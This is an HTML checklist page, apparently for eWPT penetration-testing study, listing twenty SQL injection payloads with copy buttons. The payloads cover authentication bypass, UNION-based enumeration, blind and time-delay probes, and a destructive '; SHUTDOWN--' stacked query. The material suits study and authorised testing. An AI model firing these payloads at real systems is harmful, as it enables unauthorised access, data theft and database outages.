<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>SQLi Payload Checklist - eWPT</title>
    <style>
        body { font-family: sans-serif; background-color: #0d1117; color: #c9d1d9; margin: 20px; }
        h2 { color: #58a6ff; border-bottom: 1px solid #30363d; padding-bottom: 10px; }
        table { width: 100%; border-collapse: collapse; background-color: #161b22; }
        th, td { padding: 12px; text-align: left; border: 1px solid #30363d; }
        th { background-color: #0d1117; color: #58a6ff; }
        tr:hover { background-color: #21262d; }
        .code { font-family: monospace; color: #ffa657; font-size: 1.1em; }
        button { background: #238636; color: white; border: none; padding: 5px 10px; border-radius: 4px; cursor: pointer; }
        button:hover { background: #2ea043; }
        input[type="text"] { background: #0d1117; border: 1px solid #30363d; color: white; width: 95%; }
    </style>
</head>
<body>

    <h2>🗄️ SQL Injection Checklist</h2>

    <table>
        <thead>
            <tr>
                <th>#</th>
                <th>Payload</th>
                <th>Description</th>
                <th>Action</th>
                <th>Done</th>
                <th>Notes</th>
            </tr>
        </thead>
        <tbody id="sqliBody"></tbody>
    </table>

    <script>
        const payloads = [
            { id: 1, p: "'", d: "Classic Quote: Trigger error" },
            { id: 2, p: "''", d: "Double Quote: Escape test" },
            { id: 3, p: "' OR 1=1--", d: "Auth Bypass (MySQL/MSSQL)" },
            { id: 4, p: '" OR 1=1#', d: "Auth Bypass (Double Quote/#)" },
            { id: 5, p: "' OR '1'='1", d: "Quote Wrap: No comments" },
            { id: 6, p: "admin' --", d: "Username Harvest" },
            { id: 7, p: "' UNION SELECT 1,2,3--", d: "Column Discovery" },
            { id: 8, p: "' UNION SELECT @@version,NULL,NULL--", d: "Version (MySQL/MSSQL)" },
            { id: 9, p: "' UNION SELECT NULL,version(),NULL--", d: "Version (Postgres)" },
            { id: 10, p: "AND 1=1", d: "Boolean True (Blind)" },
            { id: 11, p: "AND 1=2", d: "Boolean False (Blind)" },
            { id: 12, p: "SLEEP(5)", d: "Time Delay (MySQL)" },
            { id: 13, p: "pg_sleep(5)", d: "Time Delay (Postgres)" },
            { id: 14, p: "WAITFOR DELAY '0:0:5'", d: "Time Delay (MSSQL)" },
            { id: 15, p: "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--", d: "Complex Time Bypass" },
            { id: 16, p: "' OR 1=1 LIMIT 1--", d: "Row Limit Bypass" },
            { id: 17, p: "ORDER BY 1--", d: "Column Count Discovery" },
            { id: 18, p: "' HAVING 1=1--", d: "Error-Based Enumeration" },
            { id: 19, p: "admin' AND 1=(SELECT COUNT(*) FROM users);--", d: "Blind Count Test" },
            { id: 20, p: "'; SHUTDOWN--", d: "Stacked Query Test" }
        ];

        const body = document.getElementById('sqliBody');
        payloads.forEach(item => {
            const row = document.createElement('tr');
            row.innerHTML = `
                <td>${item.id}</td>
                <td><span class="code">${item.p}</span></td>
                <td>${item.d}</td>
                <td><button onclick="copyP('${item.p.replace(/'/g, "\\'")}')">Copy</button></td>
                <td><input type="checkbox"></td>
                <td><input type="text"></td>
            `;
            body.appendChild(row);
        });

        function copyP(txt) {
            navigator.clipboard.writeText(txt);
            event.target.innerText = "Done!";
            setTimeout(() => { event.target.innerText = "Copy"; }, 800);
        }
    </script>
</body>
</html>
